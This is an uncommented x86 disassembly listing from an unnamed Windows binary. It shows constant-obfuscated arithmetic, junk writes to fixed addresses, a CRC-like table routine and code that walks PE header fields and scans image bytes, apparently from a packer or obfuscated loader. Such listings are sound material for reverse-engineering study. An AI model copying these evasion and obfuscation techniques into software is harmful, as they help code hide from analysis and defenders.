  419550:	mov    eax,DWORD PTR [ebp+0xc]
  419553:	xor    eax,esi
  419555:	mov    ecx,0xffcd8d1e
  41955a:	sub    ecx,eax
  41955c:	add    ecx,DWORD PTR [ebp+0x8]
  41955f:	mov    DWORD PTR [ebp+0x8],ecx
  419562:	mov    eax,DWORD PTR [ebp+0x10]
  419565:	cmp    eax,ebx
  419567:	jne    0x419463
  41956d:	mov    eax,DWORD PTR [ebp-0x24]
  419570:	jmp    0x419575
  419572:	mov    eax,DWORD PTR [ebp-0x4]
  419575:	xor    eax,esi
  419577:	add    eax,edi
  419579:	pop    edi
  41957a:	pop    esi
  41957b:	pop    ebx
  41957c:	leave  
  41957d:	ret    0xc
  419580:	push   ebp
  419581:	mov    ebp,esp
  419583:	sub    esp,0x14
  419586:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41958d:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  419594:	mov    eax,DWORD PTR [ebx]
  419596:	mov    DWORD PTR [ebp-0x8],eax
  419599:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  4195a0:	push   esi
  4195a1:	push   edi
  4195a2:	mov    DWORD PTR [ebp-0x14],0xead718a5
  4195a9:	mov    edi,DWORD PTR [ebp-0x4]
  4195ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4195af:	mov    eax,0x751089b
  4195b4:	xor    edi,eax
  4195b6:	mov    edx,0x3272e2
  4195bb:	xor    ecx,eax
  4195bd:	add    edi,edx
  4195bf:	add    ecx,edx
  4195c1:	imul   edi,ecx
  4195c4:	jmp    0x41960c
  4195c6:	mov    ecx,DWORD PTR [ebp-0x8]
  4195c9:	mov    esi,DWORD PTR [ebp-0x4]
  4195cc:	xor    ecx,eax
  4195ce:	xor    esi,eax
  4195d0:	add    ecx,edx
  4195d2:	add    esi,edx
  4195d4:	test   esi,ecx
  4195d6:	mov    esi,DWORD PTR [ebp-0x8]
  4195d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4195dc:	je     0x4195f3
  4195de:	xor    ecx,eax
  4195e0:	xor    esi,eax
  4195e2:	add    ecx,edx
  4195e4:	add    esi,edx
  4195e6:	shr    esi,cl
  4195e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4195eb:	xor    ecx,eax
  4195ed:	add    ecx,edx
  4195ef:	xor    esi,ecx
  4195f1:	jmp    0x4195fd
  4195f3:	xor    esi,eax
  4195f5:	xor    ecx,eax
  4195f7:	add    esi,edx
  4195f9:	add    ecx,edx
  4195fb:	shr    esi,cl
  4195fd:	mov    DWORD PTR [ebp-0x8],esi
  419600:	mov    ecx,DWORD PTR [ebp-0x4]
  419603:	xor    ecx,eax
  419605:	lea    edi,[edi+ecx*1+0x3272e2]
  41960c:	mov    ecx,DWORD PTR [ebp-0xc]
  41960f:	mov    esi,DWORD PTR [ebp-0x4]
  419612:	xor    esi,eax
  419614:	xor    ecx,eax
  419616:	sub    ecx,esi
  419618:	cmp    edi,ecx
  41961a:	jbe    0x4195c6
  41961c:	mov    eax,DWORD PTR [ebp-0x8]
  41961f:	pop    edi
  419620:	mov    DWORD PTR [ebx],eax
  419622:	mov    eax,DWORD PTR [ebp-0x8]
  419625:	pop    esi
  419626:	leave  
  419627:	ret    
  419628:	push   ebp
  419629:	mov    ebp,esp
  41962b:	sub    esp,0x420
  419631:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  419638:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41963f:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  419646:	push   ebx
  419647:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41964e:	mov    eax,DWORD PTR [ebp-0x14]
  419651:	push   esi
  419652:	mov    esi,0x751089b
  419657:	push   edi
  419658:	xor    eax,esi
  41965a:	mov    edi,0x3272e2
  41965f:	add    eax,edi
  419661:	mov    DWORD PTR [ebp-0x8],eax
  419664:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41966b:	mov    DWORD PTR [ebp-0x4],0xead718a5
  419672:	mov    DWORD PTR [ebp-0x10],0x8
  419679:	mov    ecx,ecx
  41967b:	mov    eax,DWORD PTR [ebp-0xc]
  41967e:	mov    ecx,DWORD PTR [ebp-0x14]
  419681:	xor    eax,esi
  419683:	xor    ecx,esi
  419685:	add    eax,edi
  419687:	add    ecx,edi
  419689:	imul   eax,ecx
  41968c:	jmp    0x4196bf
  41968e:	mov    eax,DWORD PTR [ebp-0x4]
  419691:	sub    eax,edi
  419693:	xor    eax,esi
  419695:	mov    DWORD PTR [ebp-0x8],eax
  419698:	lea    ebx,[ebp-0x8]
  41969b:	call   0x419580
  4196a0:	mov    DWORD PTR [ebp-0x8],eax
  4196a3:	mov    eax,DWORD PTR [ebp-0x8]
  4196a6:	mov    ecx,DWORD PTR [ebp-0x4]
  4196a9:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4196b0:	mov    eax,DWORD PTR [ebp-0xc]
  4196b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4196b6:	xor    eax,esi
  4196b8:	lea    eax,[eax+ecx*1+0x3272e2]
  4196bf:	mov    DWORD PTR [ebp-0x4],eax
  4196c2:	mov    eax,DWORD PTR [ebp-0x18]
  4196c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4196c8:	xor    ecx,esi
  4196ca:	xor    eax,esi
  4196cc:	sub    eax,ecx
  4196ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4196d1:	cmp    ecx,eax
  4196d3:	jbe    0x41968e
  4196d5:	mov    eax,DWORD PTR [ebp-0x1c]
  4196d8:	xor    eax,esi
  4196da:	add    eax,edi
  4196dc:	mov    DWORD PTR [ebp-0x8],eax
  4196df:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  4196e6:	mov    ebx,ebx
  4196e8:	jmp    0x41974b
  4196ea:	mov    ecx,DWORD PTR [ebp-0x20]
  4196ed:	mov    eax,DWORD PTR [ebp-0x8]
  4196f0:	xor    ecx,esi
  4196f2:	add    ecx,edi
  4196f4:	shr    eax,cl
  4196f6:	mov    DWORD PTR [ebp-0x4],eax
  4196f9:	mov    eax,DWORD PTR [ebp+0x8]
  4196fc:	mov    cl,BYTE PTR [eax]
  4196fe:	mov    BYTE PTR [ebp+0xb],cl
  419701:	mov    cl,BYTE PTR [ebp+0xb]
  419704:	mov    edx,DWORD PTR [ebp-0x8]
  419707:	movzx  ecx,cl
  41970a:	xor    ecx,edx
  41970c:	mov    DWORD PTR [ebp+0x8],ecx
  41970f:	mov    ecx,DWORD PTR [ebp-0x18]
  419712:	mov    edx,DWORD PTR [ebp+0x8]
  419715:	xor    ecx,esi
  419717:	add    ecx,edi
  419719:	and    ecx,edx
  41971b:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  419722:	mov    edx,DWORD PTR [ebp-0x4]
  419725:	xor    ecx,edx
  419727:	mov    DWORD PTR [ebp-0x8],ecx
  41972a:	mov    ecx,DWORD PTR [ebp-0xc]
  41972d:	xor    ecx,esi
  41972f:	lea    eax,[eax+ecx*1+0x3272e2]
  419736:	mov    DWORD PTR [ebp+0x8],eax
  419739:	mov    eax,DWORD PTR [ebp-0xc]
  41973c:	xor    eax,esi
  41973e:	mov    ecx,0xffcd8d1e
  419743:	sub    ecx,eax
  419745:	add    ecx,DWORD PTR [ebp-0x10]
  419748:	mov    DWORD PTR [ebp-0x10],ecx
  41974b:	mov    eax,DWORD PTR [ebp-0x14]
  41974e:	mov    ecx,DWORD PTR [ebp-0x10]
  419751:	xor    eax,esi
  419753:	add    eax,edi
  419755:	cmp    ecx,eax
  419757:	jne    0x4196ea
  419759:	mov    eax,DWORD PTR [ebp-0x1c]
  41975c:	mov    ecx,DWORD PTR [ebp-0x8]
  41975f:	xor    eax,esi
  419761:	add    eax,edi
  419763:	pop    edi
  419764:	pop    esi
  419765:	xor    eax,ecx
  419767:	pop    ebx
  419768:	leave  
  419769:	ret    0x4
  41976c:	push   ebp
  41976d:	mov    ebp,esp
  41976f:	mov    eax,DWORD PTR [ebp+0x1c]
  419772:	mov    ecx,DWORD PTR [ebp+0x8]
  419775:	mov    edx,DWORD PTR [ebp+0x10]
  419778:	mov    eax,DWORD PTR [eax+0x190]
  41977e:	mov    eax,DWORD PTR [eax]
  419780:	sub    esp,0x64
  419783:	push   ebx
  419784:	push   esi
  419785:	push   edi
  419786:	mov    edi,0x751089b
  41978b:	xor    ecx,edi
  41978d:	mov    ebx,0x3272e2
  419792:	add    ecx,ebx
  419794:	cmp    ecx,edx
  419796:	jne    0x4197a7
  419798:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  4197a2:	jmp    0x419ca3
  4197a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4197aa:	mov    esi,DWORD PTR [ebp+0x14]
  4197ad:	mov    edx,DWORD PTR [esi]
  4197af:	xor    ecx,edi
  4197b1:	add    ecx,ebx
  4197b3:	cmp    edx,ecx
  4197b5:	je     0x419c5e
  4197bb:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197be:	mov    DWORD PTR [ebp-0x1c],eax
  4197c1:	mov    DWORD PTR [ebp+0x1c],ecx
  4197c4:	mov    ecx,DWORD PTR [ebp+0x18]
  4197c7:	mov    eax,DWORD PTR [esi]
  4197c9:	mov    DWORD PTR [ebp-0x20],eax
  4197cc:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  4197d3:	mov    edx,0xf89c8584
  4197d8:	mov    DWORD PTR [ebp-0x8],edx
  4197db:	mov    eax,DWORD PTR [ebp+0x1c]
  4197de:	mov    DWORD PTR [ebp+0x1c],eax
  4197e1:	mov    eax,DWORD PTR [ebp+0x1c]
  4197e4:	mov    eax,DWORD PTR [eax+0x190]
  4197ea:	mov    eax,DWORD PTR [eax]
  4197ec:	mov    DWORD PTR [ebp-0x24],ecx
  4197ef:	mov    ecx,DWORD PTR [ebp+0x1c]
  4197f2:	mov    ecx,DWORD PTR [ecx+0x190]
  4197f8:	mov    ecx,DWORD PTR [ecx]
  4197fa:	add    ecx,DWORD PTR [eax+0x3c]
  4197fd:	mov    DWORD PTR [ebp+0x10],ecx
  419800:	mov    eax,DWORD PTR [ebp+0x8]
  419803:	xor    eax,edi
  419805:	add    eax,ebx
  419807:	mov    DWORD PTR [ebp-0x4],eax
  41980a:	mov    eax,DWORD PTR [ebp+0x8]
  41980d:	xor    eax,edi
  41980f:	add    eax,ebx
  419811:	mov    DWORD PTR [ebp+0x18],eax
  419814:	mov    eax,DWORD PTR [ebp+0x10]
  419817:	mov    eax,DWORD PTR [eax+0x50]
  41981a:	sub    eax,0xc
  41981d:	mov    DWORD PTR [ebp-0x28],eax
  419820:	mov    eax,DWORD PTR [ebp+0x10]
  419823:	mov    eax,DWORD PTR [eax+0x38]
  419826:	mov    ecx,DWORD PTR [ebp+0x10]
  419829:	dec    eax
  41982a:	test   DWORD PTR [ecx+0x54],eax
  41982d:	mov    eax,DWORD PTR [ebp+0x10]
  419830:	je     0x41984a
  419832:	mov    eax,DWORD PTR [eax+0x38]
  419835:	mov    ecx,DWORD PTR [ebp+0x10]
  419838:	mov    ecx,DWORD PTR [ecx+0x54]
  41983b:	dec    eax
  41983c:	not    eax
  41983e:	and    ecx,eax
  419840:	mov    eax,DWORD PTR [ebp+0x10]
  419843:	mov    eax,DWORD PTR [eax+0x38]
  419846:	add    eax,ecx
  419848:	jmp    0x41984d
  41984a:	mov    eax,DWORD PTR [eax+0x54]
  41984d:	mov    DWORD PTR [ebp+0x1c],eax
  419850:	mov    eax,DWORD PTR [ebp+0x8]
  419853:	xor    eax,edi
  419855:	add    eax,ebx
  419857:	mov    DWORD PTR [ebp+0x18],eax
  41985a:	mov    eax,DWORD PTR [ebp+0x8]
  41985d:	xor    eax,edi
  41985f:	add    eax,ebx
  419861:	mov    DWORD PTR [ebp+0x18],eax
  419864:	mov    eax,DWORD PTR [ebp+0x8]
  419867:	mov    ecx,DWORD PTR [ebp-0x24]
  41986a:	xor    eax,edi
  41986c:	add    eax,ebx
  41986e:	mov    DWORD PTR [ecx],eax
  419870:	mov    DWORD PTR [ebp+0x18],edx
  419873:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  41987a:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  419881:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  419888:	mov    eax,DWORD PTR [ebp-0x8]
  41988b:	mov    ecx,DWORD PTR [ebp+0x1c]
  41988e:	xor    eax,edi
  419890:	add    eax,ebx
  419892:	imul   eax,ecx
  419895:	mov    ecx,DWORD PTR [ebp+0x8]
  419898:	mov    edx,DWORD PTR [ebp-0x28]
  41989b:	xor    ecx,edi
  41989d:	lea    ecx,[ecx+edx*1+0x3272e2]
  4198a4:	cmp    eax,ecx
  4198a6:	jae    0x419c57
  4198ac:	mov    eax,DWORD PTR [ebp+0x8]
  4198af:	xor    eax,edi
  4198b1:	add    eax,ebx
  4198b3:	mov    DWORD PTR [ebp+0x18],eax
  4198b6:	mov    eax,DWORD PTR [ebp+0x1c]
  4198b9:	add    eax,DWORD PTR [ebp-0x1c]
  4198bc:	mov    DWORD PTR [ebp-0x4],eax
  4198bf:	push   DWORD PTR [ebp-0x4]
  4198c2:	mov    esi,DWORD PTR [ebp-0x1c]
  4198c5:	mov    ecx,DWORD PTR [ebp+0x10]
  4198c8:	call   0x4189c0
  4198cd:	mov    DWORD PTR [ebp+0xc],eax
  4198d0:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4198d7:	mov    eax,DWORD PTR [ebp-0x18]
  4198da:	xor    eax,edi
  4198dc:	lea    ecx,[ebp-0x40]
  4198df:	add    eax,ebx
  4198e1:	push   ecx
  4198e2:	call   0x418fa3
  4198e7:	mov    eax,DWORD PTR [ebp+0xc]
  4198ea:	test   eax,eax
  4198ec:	je     0x41993c
  4198ee:	mov    eax,DWORD PTR [ebp-0x18]
  4198f1:	xor    eax,edi
  4198f3:	add    eax,ebx
  4198f5:	push   eax
  4198f6:	push   DWORD PTR [ebp+0xc]
  4198f9:	lea    eax,[ebp-0x40]
  4198fc:	push   eax
  4198fd:	call   0x418e4a
  419902:	mov    eax,DWORD PTR [ebp-0x4]
  419905:	mov    DWORD PTR [ebp-0x18],eax
  419908:	mov    eax,DWORD PTR [ebp-0x18]
  41990b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41990e:	sub    eax,ecx
  419910:	mov    DWORD PTR [ebp-0x18],eax
  419913:	mov    eax,DWORD PTR [ebp+0xc]
  419916:	mov    ecx,DWORD PTR [ebp+0xc]
  419919:	mov    eax,DWORD PTR [eax+0x10]
  41991c:	add    eax,DWORD PTR [ecx+0xc]
  41991f:	mov    ecx,DWORD PTR [ebp-0x18]
  419922:	cmp    ecx,eax
  419924:	jb     0x41993c
  419926:	mov    eax,DWORD PTR [ebp+0xc]
  419929:	mov    eax,DWORD PTR [eax+0xc]
  41992c:	mov    ecx,DWORD PTR [ebp+0xc]
  41992f:	add    eax,DWORD PTR [ecx+0x8]
  419932:	mov    ecx,DWORD PTR [ebp-0x18]
  419935:	sub    eax,ecx
  419937:	jmp    0x419c2a
  41993c:	push   0xc
  41993e:	push   DWORD PTR [ebp-0x4]
  419941:	lea    eax,[ebp-0x4c]
  419944:	push   eax
  419945:	call   0x418e4a
  41994a:	mov    eax,0xf89c8585
  41994f:	mov    DWORD PTR [ebp-0x2c],eax
  419952:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  419959:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  419960:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  419967:	lea    ecx,[ebp-0x2c]
  41996a:	mov    DWORD PTR [ebp-0xc],ecx
  41996d:	lea    ecx,[ebp-0x30]
  419970:	mov    DWORD PTR [ebp-0x10],ecx
  419973:	lea    ecx,[ebp-0x34]
  419976:	mov    DWORD PTR [ebp+0xc],ecx
  419979:	lea    ecx,[ebp-0x38]
  41997c:	mov    DWORD PTR [ebp-0x14],ecx
  41997f:	mov    ecx,DWORD PTR [ebp+0x8]
  419982:	xor    ecx,edi
  419984:	add    ecx,ebx
  419986:	mov    DWORD PTR [ebp-0x18],ecx
  419989:	jmp    0x419b85
  41998e:	cmp    eax,0xf89c85bb
  419993:	je     0x419b97
  419999:	mov    ecx,DWORD PTR [ebp-0x8]
  41999c:	xor    ecx,edi
  41999e:	mov    esi,eax
  4199a0:	add    ecx,ebx
  4199a2:	mov    DWORD PTR [ebp+0x18],ecx
  4199a5:	mov    eax,DWORD PTR [ebp-0x18]
  4199a8:	xor    esi,edi
  4199aa:	lea    eax,[eax+esi*1+0x3272e2]
  4199b1:	mov    DWORD PTR [ebp-0x18],eax
  4199b4:	mov    eax,DWORD PTR [ebp-0x8]
  4199b7:	mov    ecx,DWORD PTR [ebp-0x18]
  4199ba:	xor    eax,edi
  4199bc:	add    eax,ebx
  4199be:	cmp    ecx,eax
  4199c0:	jne    0x4199d5
  4199c2:	mov    eax,DWORD PTR [ebp+0x8]
  4199c5:	xor    eax,edi
  4199c7:	add    eax,ebx
  4199c9:	push   eax
  4199ca:	push   0xc
  4199cc:	lea    eax,[ebp-0x4c]
  4199cf:	push   eax
  4199d0:	call   0x4193d7
  4199d5:	mov    eax,DWORD PTR [ebp-0xc]
  4199d8:	mov    eax,DWORD PTR [eax]
  4199da:	xor    eax,edi
  4199dc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  4199e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4199e6:	xor    ecx,edi
  4199e8:	movzx  eax,al
  4199eb:	add    ecx,ebx
  4199ed:	cmp    eax,ecx
  4199ef:	je     0x419b6d
  4199f5:	mov    eax,DWORD PTR [ebp-0x10]
  4199f8:	mov    eax,DWORD PTR [eax]
  4199fa:	xor    eax,edi
  4199fc:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a03:	mov    ecx,DWORD PTR [ebp+0x8]
  419a06:	xor    ecx,edi
  419a08:	movzx  eax,al
  419a0b:	add    ecx,ebx
  419a0d:	cmp    eax,ecx
  419a0f:	je     0x419b6d
  419a15:	mov    eax,DWORD PTR [ebp+0xc]
  419a18:	mov    eax,DWORD PTR [eax]
  419a1a:	xor    eax,edi
  419a1c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a23:	mov    ecx,DWORD PTR [ebp+0x8]
  419a26:	xor    ecx,edi
  419a28:	movzx  eax,al
  419a2b:	add    ecx,ebx
  419a2d:	cmp    eax,ecx
  419a2f:	je     0x419b6d
  419a35:	mov    eax,DWORD PTR [ebp-0x14]
  419a38:	mov    eax,DWORD PTR [eax]
  419a3a:	xor    eax,edi
  419a3c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a43:	mov    ecx,DWORD PTR [ebp+0x8]
  419a46:	xor    ecx,edi
  419a48:	movzx  eax,al
  419a4b:	add    ecx,ebx
  419a4d:	cmp    eax,ecx
  419a4f:	je     0x419b6d
  419a55:	mov    eax,DWORD PTR [ebp-0x10]
  419a58:	mov    eax,DWORD PTR [eax]
  419a5a:	xor    eax,edi
  419a5c:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419a63:	mov    ecx,DWORD PTR [ebp-0xc]
  419a66:	mov    ecx,DWORD PTR [ecx]
  419a68:	xor    ecx,edi
  419a6a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a71:	xor    al,cl
  419a73:	mov    ecx,DWORD PTR [ebp+0xc]
  419a76:	mov    ecx,DWORD PTR [ecx]
  419a78:	xor    ecx,edi
  419a7a:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419a81:	or     al,cl
  419a83:	mov    ecx,DWORD PTR [ebp-0xc]
  419a86:	mov    ecx,DWORD PTR [ecx]
  419a88:	xor    ecx,edi
  419a8a:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419a91:	cmp    cl,al
  419a93:	jne    0x419b6d
  419a99:	mov    eax,DWORD PTR [ebp+0xc]
  419a9c:	mov    eax,DWORD PTR [eax]
  419a9e:	xor    eax,edi
  419aa0:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aa7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aaa:	mov    ecx,DWORD PTR [ecx]
  419aac:	xor    ecx,edi
  419aae:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ab5:	xor    al,cl
  419ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  419aba:	mov    ecx,DWORD PTR [ecx]
  419abc:	xor    ecx,edi
  419abe:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419ac5:	or     al,cl
  419ac7:	mov    ecx,DWORD PTR [ebp-0x10]
  419aca:	mov    ecx,DWORD PTR [ecx]
  419acc:	xor    ecx,edi
  419ace:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419ad5:	cmp    cl,al
  419ad7:	jne    0x419b6d
  419add:	mov    eax,DWORD PTR [ebp-0x14]
  419ae0:	mov    eax,DWORD PTR [eax]
  419ae2:	xor    eax,edi
  419ae4:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419aeb:	mov    ecx,DWORD PTR [ebp+0xc]
  419aee:	mov    ecx,DWORD PTR [ecx]
  419af0:	xor    ecx,edi
  419af2:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419af9:	xor    al,cl
  419afb:	mov    ecx,DWORD PTR [ebp-0xc]
  419afe:	mov    ecx,DWORD PTR [ecx]
  419b00:	xor    ecx,edi
  419b02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b09:	or     al,cl
  419b0b:	mov    ecx,DWORD PTR [ebp+0xc]
  419b0e:	mov    ecx,DWORD PTR [ecx]
  419b10:	xor    ecx,edi
  419b12:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b19:	cmp    cl,al
  419b1b:	jne    0x419b6d
  419b1d:	mov    eax,DWORD PTR [ebp-0x14]
  419b20:	mov    eax,DWORD PTR [eax]
  419b22:	xor    eax,edi
  419b24:	mov    al,BYTE PTR [ebp+eax*1+0x327296]
  419b2b:	mov    ecx,DWORD PTR [ebp-0xc]
  419b2e:	mov    ecx,DWORD PTR [ecx]
  419b30:	xor    ecx,edi
  419b32:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b39:	xor    al,cl
  419b3b:	mov    ecx,DWORD PTR [ebp-0x10]
  419b3e:	mov    ecx,DWORD PTR [ecx]
  419b40:	xor    ecx,edi
  419b42:	mov    cl,BYTE PTR [ebp+ecx*1+0x327296]
  419b49:	or     al,cl
  419b4b:	mov    ecx,DWORD PTR [ebp-0x14]
  419b4e:	mov    ecx,DWORD PTR [ecx]
  419b50:	xor    ecx,edi
  419b52:	mov    cl,BYTE PTR [ebp+ecx*1+0x32729a]
  419b59:	cmp    cl,al
  419b5b:	jne    0x419b6d
  419b5d:	lea    eax,[ebp-0x4c]
  419b60:	push   eax
  419b61:	call   0x419628
  419b66:	mov    ecx,DWORD PTR [ebp-0x44]
  419b69:	cmp    eax,ecx
  419b6b:	je     0x419b77
  419b6d:	mov    eax,DWORD PTR [ebp+0x8]
  419b70:	xor    eax,edi
  419b72:	add    eax,ebx
  419b74:	mov    DWORD PTR [ebp+0x18],eax
  419b77:	mov    eax,DWORD PTR [ebp-0x8]
  419b7a:	xor    eax,edi
  419b7c:	lea    eax,[eax+esi*1+0x3272e2]
  419b83:	xor    eax,edi
  419b85:	mov    ecx,DWORD PTR [ebp+0x8]
  419b88:	mov    edx,DWORD PTR [ebp+0x18]
  419b8b:	xor    ecx,edi
  419b8d:	add    ecx,ebx
  419b8f:	cmp    edx,ecx
  419b91:	je     0x41998e
  419b97:	mov    eax,DWORD PTR [ebp+0x8]
  419b9a:	mov    ecx,DWORD PTR [ebp+0x18]
  419b9d:	xor    eax,edi
  419b9f:	add    eax,ebx
  419ba1:	cmp    ecx,eax
  419ba3:	jne    0x419bb6
  419ba5:	mov    eax,DWORD PTR [ebp-0x8]
  419ba8:	mov    ecx,DWORD PTR [ebp+0x1c]
  419bab:	xor    eax,edi
  419bad:	lea    eax,[eax+ecx*1+0x3272e2]
  419bb4:	jmp    0x419c2d
  419bb6:	push   0x18
  419bb8:	push   DWORD PTR [ebp-0x4]
  419bbb:	lea    eax,[ebp-0x64]
  419bbe:	push   eax
  419bbf:	call   0x418e4a
  419bc4:	mov    eax,DWORD PTR [ebp+0x8]
  419bc7:	mov    ecx,DWORD PTR [ebp-0x18]
  419bca:	xor    eax,edi
  419bcc:	add    eax,ebx
  419bce:	cmp    eax,ecx
  419bd0:	je     0x419be5
  419bd2:	mov    eax,DWORD PTR [ebp+0x8]
  419bd5:	xor    eax,edi
  419bd7:	add    eax,ebx
  419bd9:	push   eax
  419bda:	push   0x18
  419bdc:	lea    eax,[ebp-0x64]
  419bdf:	push   eax
  419be0:	call   0x4193d7
  419be5:	mov    eax,DWORD PTR [ebp-0x4]
  419be8:	add    eax,0x18
  419beb:	mov    DWORD PTR [ebp+0x18],eax
  419bee:	push   DWORD PTR [ebp-0x50]
  419bf1:	push   DWORD PTR [ebp+0x18]
  419bf4:	mov    eax,DWORD PTR [ebp-0x54]
  419bf7:	add    eax,DWORD PTR [ebp-0x20]
  419bfa:	push   eax
  419bfb:	call   0x418e4a
  419c00:	mov    eax,DWORD PTR [ebp+0x8]
  419c03:	mov    ecx,DWORD PTR [ebp-0x18]
  419c06:	xor    eax,edi
  419c08:	add    eax,ebx
  419c0a:	cmp    eax,ecx
  419c0c:	je     0x419c1f
  419c0e:	push   0x0
  419c10:	push   DWORD PTR [ebp-0x50]
  419c13:	mov    eax,DWORD PTR [ebp-0x54]
  419c16:	add    eax,DWORD PTR [ebp-0x20]
  419c19:	push   eax
  419c1a:	call   0x4193d7
  419c1f:	mov    eax,DWORD PTR [ebp-0x24]
  419c22:	mov    ecx,DWORD PTR [ebp-0x50]
  419c25:	add    DWORD PTR [eax],ecx
  419c27:	mov    eax,DWORD PTR [ebp-0x50]
  419c2a:	add    eax,DWORD PTR [ebp+0x1c]
  419c2d:	mov    DWORD PTR [ebp+0x1c],eax
  419c30:	mov    eax,DWORD PTR [ebp-0x8]
  419c33:	mov    ecx,DWORD PTR [ebp+0x1c]
  419c36:	xor    eax,edi
  419c38:	add    eax,ebx
  419c3a:	imul   eax,ecx
  419c3d:	mov    ecx,DWORD PTR [ebp+0x8]
  419c40:	mov    edx,DWORD PTR [ebp-0x28]
  419c43:	xor    ecx,edi
  419c45:	lea    ecx,[ecx+edx*1+0x3272e2]
  419c4c:	cmp    eax,ecx
  419c4e:	jb     0x4198ac
  419c54:	mov    esi,DWORD PTR [ebp+0x14]
  419c57:	mov    eax,DWORD PTR [ebp-0x20]
  419c5a:	mov    DWORD PTR [esi],eax
  419c5c:	jmp    0x419ca3
  419c5e:	mov    ecx,DWORD PTR [ebp+0x8]
  419c61:	mov    edx,DWORD PTR [ebp+0xc]
  419c64:	xor    ecx,edi
  419c66:	xor    edx,edi
  419c68:	add    ecx,ebx
  419c6a:	add    edx,ebx
  419c6c:	cmp    ecx,edx
  419c6e:	jne    0x419c82
  419c70:	mov    eax,ds:0x7f642d1e
  419c75:	imul   eax,eax,0x9f15fcef
  419c7b:	mov    ds:0x7f642d1e,eax
  419c80:	jmp    0x419ca3
  419c82:	mov    ecx,DWORD PTR [ebp+0x8]
  419c85:	xor    ecx,edi
  419c87:	add    ecx,ebx
  419c89:	cmp    eax,ecx
  419c8b:	je     0x419c99
  419c8d:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  419c97:	jmp    0x419ca3
  419c99:	and    DWORD PTR ds:0x3343fa1e,0x5265ec3f
  419ca3:	pop    edi
  419ca4:	pop    esi
  419ca5:	pop    ebx
  419ca6:	leave  
  419ca7:	ret    0x18
  419caa:	push   ebp
  419cab:	mov    ebp,esp
  419cad:	and    esp,0xfffffff8
  419cb0:	mov    eax,DWORD PTR [ebp+0x20]
  419cb3:	sub    esp,0x14
  419cb6:	push   ebx
  419cb7:	mov    ebx,DWORD PTR [ebp+0x14]
  419cba:	push   esi
  419cbb:	push   edi
  419cbc:	cmp    eax,0xf89c8585
  419cc1:	jne    0x419ccd
  419cc3:	push   0xf89c8584
  419cc8:	jmp    0x419dff
  419ccd:	mov    eax,DWORD PTR [ebp+0x20]
  419cd0:	cmp    eax,0xf89c8584
  419cd5:	jne    0x419ce1
  419cd7:	push   0xf89c85bb
  419cdc:	jmp    0x419dff
  419ce1:	mov    eax,DWORD PTR [ebp+0x20]
  419ce4:	cmp    eax,0xf89c85bb
  419ce9:	jne    0x419cf5
  419ceb:	push   0xf89c85ba
  419cf0:	jmp    0x419dff
  419cf5:	mov    eax,DWORD PTR [ebp+0x20]
  419cf8:	cmp    eax,0xf89c85ba
  419cfd:	jne    0x419d09
  419cff:	push   0xf89c85b9
  419d04:	jmp    0x419dff
  419d09:	mov    ecx,DWORD PTR [ebp+0x20]
  419d0c:	mov    eax,0xf89c85be
  419d11:	cmp    ecx,eax
  419d13:	jne    0x419dcf
  419d19:	mov    eax,DWORD PTR [ebp+0x10]
  419d1c:	mov    DWORD PTR [esp+0xc],eax
  419d20:	mov    eax,DWORD PTR [ebp+0x18]
  419d23:	mov    DWORD PTR [esp+0x14],eax
  419d27:	mov    eax,DWORD PTR [ebp+0xc]
  419d2a:	mov    DWORD PTR [esp+0x18],eax
  419d2e:	mov    eax,DWORD PTR [ebp+0x8]
  419d31:	mov    DWORD PTR [esp+0x10],eax
  419d35:	mov    eax,DWORD PTR [esp+0x10]
  419d39:	mov    ecx,DWORD PTR [esp+0x14]
  419d3d:	mov    edi,0x751089b
  419d42:	xor    eax,edi
  419d44:	mov    esi,0x3272e2
  419d49:	add    eax,esi
  419d4b:	mov    DWORD PTR [ecx],eax
